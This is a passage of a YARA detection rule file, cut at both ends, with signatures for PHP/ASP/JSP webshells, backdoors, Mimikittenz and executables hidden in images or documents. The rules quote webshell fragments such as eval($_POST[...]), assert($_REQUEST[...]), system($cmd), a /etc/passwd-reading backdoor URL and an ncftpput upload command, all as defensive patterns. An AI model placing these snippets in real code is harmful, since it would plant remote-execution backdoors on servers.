$op1 = { 3c ee 42 00 c7 84 24 8c } /* Opcode */
$op2 = { a1 e0 79 44 00 83 c4 0c ff 74 24 1c ff 90 3c 01 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )
}
rule SSC_Invoke_mimikittenz {
meta:
description = "Detects Mimikittenz - file Invoke-mimikittenz.ps1"
author = "Florian Roth"
reference = "https://github.com/putterpanda/mimikittenz"
date = "2016-07-19"
score = 90
hash1 = "14e2f70470396a18c27debb419a4f4063c2ad5b6976f429d47f55e31066a5e6a"
strings:
$x1 = "[mimikittenz.MemProcInspector]" ascii
$s1 = "PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |" fullword ascii
$s2 = "IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);" fullword ascii
$s3 = "&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=" ascii
$s4 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 60KB and 2 of them ) or $x1
}
rule SSC_Sakurel_backdoor
{
meta:
maltype = "Sakurel backdoor"
ref = "https://github.com/reed1713"
reference = "http://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan:Win32/Sakurel.A#tab=2"
description = "malware creates a process in the temp directory and performs the sysprep UAC bypass method."
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data="Windows\\System32\\sysprep\\sysprep.exe" nocase
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4688"
$data1="AppData\\Local\\Temp\\MicroMedia\\MediaCenter.exe" nocase
condition:
all of them
}
rule SSC_Embedded_EXE_Cloaking : maldoc {
meta:
description = "Detects an embedded executable in a non-executable file"
author = "Florian Roth"
date = "2015/02/27"
score = 80
strings:
$noex_png = { 89 50 4E 47 }
$noex_pdf = { 25 50 44 46 }
$noex_rtf = { 7B 5C 72 74 66 31 }
$noex_jpg = { FF D8 FF E0 }
$noex_gif = { 47 49 46 38 }
$mz  = { 4D 5A }
$a1 = "This program cannot be run in DOS mode"
$a2 = "This program must be run under Win32"
condition:
(
( $noex_png at 0 ) or
( $noex_pdf at 0 ) or
( $noex_rtf at 0 ) or
( $noex_jpg at 0 ) or
( $noex_gif at 0 )
)
and
for any i in (1..#mz): ( @a1 < ( @mz[i] + 200 ) or @a2 < ( @mz[i] + 200 ) )
}
rule SSC_chinese_spam_echoer : webshell
{
meta:
author      = "Vlad https://github.com/vlad-s"
date        = "2016/07/18"
description = "Catches chinese PHP spam files (printers)"
strings:
$a = "set_time_limit(0)"
$b = "date_default_timezone_set('PRC');"
$c = "$Content_mb;"
$d = "/index.php?host="
condition:
all of them
}
rule SSC_FSO_s_phpinj {
meta:
description = "Webshells Auto-generated - file phpinj.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "dd39d17e9baca0363cc1c3664e608929"
strings:
$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
condition:
all of them
}
rule SSC_webshell_webshells_new_php5 {
meta:
description = "Web shells - generated from file php5.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "cf2ab009cbd2576a806bfefb74906fdf"
strings:
$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
condition:
all of them
}
rule SSC_multiple_php_webshells_2 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt, ctt_sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
hash6 = "09609851caa129e40b0d56e90dfc476c"
hash7 = "671cad517edd254352fe7e0c7c981c39"
strings:
$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
condition:
all of them
}
rule SSC_webshell_Java_Shell {
meta:
description = "Web Shell - file Java Shell.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "36403bc776eb12e8b7cc0eb47c8aac83"
strings:
$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
condition:
1 of them
}
rule SSC_webshell_PH_Vayv_PH_Vayv : webshell {
meta:
description = "Web Shell - file PH Vayv.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "35fb37f3c806718545d97c6559abd262"
strings:
$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
condition:
1 of them
}
rule SSC_Debug_dllTest_2 {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1b9e518aaa62b15079ff6edb412b21e9"
strings:
$s4 = "\\Debug\\dllTest.pdb"
$s5 = "--list the services in the computer"
condition:
all of them
}
rule SSC_PHP_shell {
meta:
description = "Webshells Auto-generated - file shell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
strings:
$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
condition:
all of them
}
rule SSC_BackDooR__fr_ {
meta:
description = "Webshells Auto-generated - file BackDooR (fr).php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a79cac2cf86e073a832aaf29a664f4be"
strings:
$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
condition:
all of them
}
rule SSC_webshell_Sst_Sheller {
meta:
description = "Web Shell - file Sst-Sheller.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d93c62a0a042252f7531d8632511ca56"
strings:
$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
condition:
all of them
}
rule SSC_RemExp_asp {
meta:
description = "Semi-Auto-generated  - file RemExp.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "aa1d8491f4e2894dbdb91eec1abc2244"
strings:
$s0 = "<title>Remote Explorer</title>"
$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
condition:
2 of them
}
rule SSC_webshell_asp_Rader {
meta:
description = "Web Shell - file Rader.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "ad1a362e0a24c4475335e3e891a01731"
strings:
$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
condition:
all of them
}
rule SSC_multiple_webshells_0019 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
strings:
$s0 = "<b>Dumped! Dump has been writed to "
$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
condition:
1 of them
}
rule SSC_FSO_s_ntdaddy {
meta:
description = "Webshells Auto-generated - file ntdaddy.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
strings:
$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
condition:
all of them
}
rule SSC_simple_backdoor_php {
meta:
description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "f091d1b9274c881f8e41b2f96e6b9936"
strings:
$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
condition:
2 of them
}
rule SSC_WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
meta:
description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
author = "Florian Roth"
hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
strings:
$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
$s15 = "if(empty($_GET['file'])){" fullword
$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword
condition:
3 of them
}
rule SSC_Ajax_PHP_Command_Shell_php {
meta:
description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "93d1a2e13a3368a2472043bd6331afe9"
strings:
$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><form enct"
condition:
1 of them
}
rule SSC_webshell_Ani_Shell {
meta:
description = "Web Shell - file Ani-Shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "889bfc9fbb8ee7832044fc575324d01a"
strings:
$s0 = "$Python_CODE = \"I"
$s6 = "$passwordPrompt = \"\\n================================================="
$s7 = "fputs ($sockfd ,\"\\n==============================================="
condition:
1 of them
}
rule SSC_Mithril_v1_45_Mithril {
meta:
description = "Webshells Auto-generated - file Mithril.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "f1484f882dc381dde6eaa0b80ef64a07"
strings:
$s2 = "cress.exe"
$s7 = "\\Debug\\Mithril."
condition:
all of them
}
rule SSC_multiple_webshells_0016 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php"
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
hash2 = "8023394542cddf8aee5dec6072ed02b5"
hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
hash4 = "817671e1bdc85e04cc3440bbd9288800"
strings:
$s1 = "if(rmdir($_POST['mk_name']))"
$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
condition:
2 of them
}
rule SSC_dbgiis6cli {
meta:
description = "Webshells Auto-generated - file dbgiis6cli.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3044dceb632b636563f66fee3aaaf8f3"
strings:
$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
$s5 = "###command:(NO more than 100 bytes!)"
condition:
all of them
}
rule SSC_WebShell_reader_asp_php {
meta:
description = "PHP Webshells Github Archive - file reader.asp.php.txt"
author = "Florian Roth"
hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
strings:
$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
$s12 = " HACKING " fullword
$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
condition:
3 of them
}
rule SSC_hidshell_php_php {
meta:
description = "Semi-Auto-generated  - file hidshell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "c2f3327d60884561970c63ffa09439a4"
strings:
$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
condition:
all of them
}
rule SSC_Debug_cress {
meta:
description = "Webshells Auto-generated - file cress.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "36a416186fe010574c9be68002a7286a"
strings:
$s0 = "\\Mithril "
$s4 = "Mithril.exe"
condition:
all of them
}
rule SSC_Webshell_Ayyildiz {
meta:
description = "Detects Webshell - rule generated from from files Ayyildiz Tim  -AYT- Shell v 2.1 Biz.txt, Macker's Private PHPShell.php, matamu.txt, myshell.txt, PHP Shell.txt"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
strings:
$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
condition:
filesize < 112KB and all of them
}
rule SSC_webshell_webshells_new_radhat {
meta:
description = "Web shells - generated from file radhat.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "72cb5ef226834ed791144abaa0acdfd4"
strings:
$s1 = "sod=Array(\"D\",\"7\",\"S"
condition:
all of them
}
rule SSC_phpshell17_php {
meta:
description = "Semi-Auto-generated  - file phpshell17.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "9a928d741d12ea08a624ee9ed5a8c39d"
strings:
$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
condition:
1 of them
}
rule SSC_backupsql_php_often_with_c99shell {
meta:
description = "Semi-Auto-generated  - file backupsql.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
strings:
$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
condition:
all of them
}
rule SSC_webshell_caidao_shell_ice_2 {
meta:
description = "Web Shell - file ice.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "1d6335247f58e0a5b03e17977888f5f2"
strings:
$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
condition:
all of them
}
rule SSC_WebShell_php_include_w_shell {
meta:
description = "PHP Webshells Github Archive - file php-include-w-shell.php"
author = "Florian Roth"
hash = "1a7f4868691410830ad954360950e37c582b0292"
strings:
$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
condition:
1 of them
}
rule SSC_ak74shell_php_php {
meta:
description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "7f83adcb4c1111653d30c6427a94f66f"
strings:
$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
$s3 = "$xshell"
condition:
2 of them
}
rule SSC_DarkSecurityTeam_Webshell {
meta:
description = "Dark Security Team Webshell"
author = "Florian Roth"
hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
score = 50
strings:
$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
condition:
1 of them
}
rule SSC_commands {
meta:
description = "Webshells Auto-generated - file commands.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "174486fe844cb388e2ae3494ac2d1ec2"
strings:
$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
condition:
all of them
}
rule SSC_r57shell_3 {
meta:
description = "Webshells Auto-generated - file r57shell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "87995a49f275b6b75abe2521e03ac2c0"
strings:
$s1 = "<b>\".$_POST['cmd']"
condition:
all of them
}
rule SSC_webshell_simple_backdoor {
meta:
description = "Web Shell - file simple-backdoor.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "f091d1b9274c881f8e41b2f96e6b9936"
strings:
$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
$s1 = "if(isset($_REQUEST['cmd'])){" fullword
$s4 = "system($cmd);" fullword
condition:
2 of them
}
rule SSC_webshell_php_sh_server : webshell {
meta:
description = "Web Shell - file server.php"
author = "Florian Roth"
date = "2014/01/28"
score = 50
hash = "d87b019e74064aa90e2bb143e5e16cfa"
strings:
$s0 = "eval(getenv('HTTP_CODE'));" fullword
condition:
all of them
}
rule SSC_webshell_redirect {
meta:
description = "Web Shell - file redirect.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "97da83c6e3efbba98df270cc70beb8f8"
strings:
$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
condition:
all of them
}
rule SSC_WebShell_RemExp_asp_php {
meta:
description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
author = "Florian Roth"
hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
strings:
$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
condition:
all of them
}
rule SSC_lamashell_php {
meta:
description = "Semi-Auto-generated  - file lamashell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "de9abc2e38420cad729648e93dfc6687"
strings:
$s0 = "lama's'hell" fullword
$s1 = "if($_POST['king'] == \"\") {"
$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
condition:
1 of them
}
rule SSC_WebShell_php_webshells_lolipop {
meta:
description = "PHP Webshells Github Archive - file lolipop.php"
author = "Florian Roth"
hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
strings:
$s3 = "$commander = $_POST['commander']; " fullword
$s9 = "$sourcego = $_POST['sourcego']; " fullword
$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword
condition:
all of them
}
rule SSC_PHP_Shell_php_php {
meta:
description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
strings:
$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
condition:
all of them
}
rule SSC_WebShell_JspWebshell_1_2_2 {
meta:
description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
author = "Florian Roth"
hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
strings:
$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
$s15 = "endPoint=random1.getFilePointer();" fullword
$s20 = "if (request.getParameter(\"command\") != null) {" fullword
condition:
3 of them
}
rule SSC_PHP_Backdoor_v1 {
meta:
description = "Webshells Auto-generated - file PHP Backdoor v1.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "0506ba90759d11d78befd21cabf41f3d"
strings:
$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"
condition:
all of them
}
rule SSC_webshell_php_2 {
meta:
description = "Web Shell - file 2.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "267c37c3a285a84f541066fc5b3c1747"
strings:
$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
condition:
all of them
}
rule SSC_WebShell_simattacker {
meta:
description = "PHP Webshells Github Archive - file simattacker.php"
author = "Florian Roth"
hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
strings:
$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
$s20 = "$Comments=$_POST['Comments'];" fullword
condition:
2 of them
}
rule SSC_WebShell_php_webshells_README {
meta:
description = "PHP Webshells Github Archive - file README.md"
author = "Florian Roth"
hash = "ef2c567b4782c994db48de0168deb29c812f7204"
strings:
$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
$s1 = "php-webshells" fullword
condition:
all of them
}
rule SSC_webshell_DarkBlade1_3_asp_indexx {
meta:
description = "Web Shell - file indexx.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b7f46693648f534c2ca78e3f21685707"
strings:
$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
condition:
all of them
}
rule SSC_WebShell_backupsql {
meta:
description = "PHP Webshells Github Archive - file backupsql.php"
author = "Florian Roth"
hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
strings:
$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
$s2 = "* as email attachment, or send to a remote ftp server by" fullword
$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
condition:
2 of them
}
rule SSC_FSO_s_phvayv {
meta:
description = "Webshells Auto-generated - file phvayv.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "205ecda66c443083403efb1e5c7f7878"
strings:
$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
condition:
all of them
}
rule SSC_webshell_webshells_new_pppp {
meta:
description = "Web shells - generated from file pppp.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "cf01cb6e09ee594545693c5d327bdd50"
strings:
$s0 = "Mail: chinese@hackermail.com" fullword
$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
$s6 = "Site: http://blog.weili.me" fullword
condition:
1 of them
}
rule SSC_rootshell_php {
meta:
description = "Semi-Auto-generated  - file rootshell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "265f3319075536030e59ba2f9ef3eac6"
strings:
$s0 = "shells.dl.am"
$s1 = "This server has been infected by $owner"
$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
$s4 = "Could not write to file! (Maybe you didn't enter any text?)"
condition:
2 of them
}
rule SSC_WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall {
meta:
description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
author = "Florian Roth"
super_rule = 1
hash0 = "b148ead15d34a55771894424ace2a92983351dda"
hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"
strings:
$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword
condition:
2 of them
}
rule SSC_jsp_reverse_jsp {
meta:
description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8b0e6779f25a17f0ffb3df14122ba594"
strings:
$s0 = "// backdoor.jsp"
$s1 = "JSP Backdoor Reverse Shell"
$s2 = "http://michaeldaw.org"
condition:
2 of them
}
rule SSC_webshell_php_list {
meta:
description = "Web Shell - file list.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "922b128ddd90e1dc2f73088956c548ed"
strings:
$s1 = "// list.php = Directory & File Listing" fullword
$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
$s9 = "// by: The Dark Raver" fullword
condition:
1 of them
}
rule SSC_h4ntu_shell__powered_by_tsoi_ {
meta:
description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "06ed0b2398f8096f1bebf092d0526137"
strings:
$s0 = "h4ntu shell"
$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
condition:
1 of them
}
rule SSC_WebShell_php_backdoor {
meta:
description = "PHP Webshells Github Archive - file php-backdoor.php"
author = "Florian Roth"
hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
strings:
$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
condition:
1 of them
}
rule SSC_Webshell_and_Exploit_CN_APT_HK : Webshell
{
meta:
author = "Florian Roth"
description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
date = "10.10.2014"
score = 50
strings:
$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"
condition:
$a0 or ( all of ($s*) )
}
rule SSC_multiple_webshells_0005 {
meta:
description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
